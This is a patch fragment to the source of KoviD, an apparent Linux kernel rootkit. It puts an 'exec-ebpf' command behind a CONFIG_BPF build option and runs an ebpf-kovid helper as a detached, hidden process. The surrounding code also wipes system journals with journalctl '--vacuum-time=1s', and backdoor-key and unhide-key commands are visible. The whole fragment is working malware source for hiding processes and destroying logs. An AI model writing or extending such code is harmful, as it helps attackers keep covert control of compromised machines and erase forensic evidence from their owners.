@@ -450,7 +450,9 @@ enum {
 	Opt_signal_task_stop,
 	Opt_signal_task_cont,
 	Opt_signal_task_kill,
+#ifdef CONFIG_BPF
 	Opt_exec_epbf,
+#endif
 
 #ifdef DEBUG_RING_BUFFER
 	/**debug */
@@ -485,7 +487,9 @@ static const match_table_t tokens = {
 	{ Opt_get_bdkey, "get-bdkey" },
 	{ Opt_get_unhidekey, "get-unhidekey" },
 #endif
+#ifdef CONFIG_BPF
 	{ Opt_exec_epbf, "exec-ebpf" },
+#endif
 	{ Opt_unknown, NULL }
 };
 
@@ -629,11 +633,12 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			break;
 		case Opt_journalclt: {
 			char *cmd[] = { JOURNALCTL, "--rotate", NULL };
-			if (!kv_run_system_command(cmd)) {
+			if (!kv_run_system_command(cmd, false, false)) {
 				cmd[1] = "--vacuum-time=1s";
-				kv_run_system_command(cmd);
+				kv_run_system_command(cmd, false, false);
 			}
 		} break;
+#ifdef CONFIG_BPF
 		case Opt_exec_epbf: {
 			static char *cmd[] = { "/usr/bin/ebpf-kovid", NULL,
 					       NULL };
@@ -641,18 +646,15 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 
 			/* Use the *detached* version so we don't block */
 			/* In addition, hide the process.*/
-			ret = kv_run_and_hide_system_command_detached(cmd);
+			ret = kv_run_system_command(cmd, true, true);
 			if (ret == 0) {
-#ifdef DEBUG_RING_BUFFER
-				pr_info("KoviD: Launched ebpf-kovid in background.\n");
-#endif
+				prinfo("KoviD: Launched ebpf-kovid in background.\n");
 			} else {
-#ifdef DEBUG_RING_BUFFER
-				pr_info("KoviD: Failed to run ebpf-kovid, ret=%d\n",
-					ret);
-#endif
+				prinfo("KoviD: Failed to run ebpf-kovid, ret=%d\n",
+				       ret);
 			}
 		} break;
+#endif
 #ifdef DEBUG_RING_BUFFER
 		case Opt_get_bdkey:
 		case Opt_get_unhidekey: {
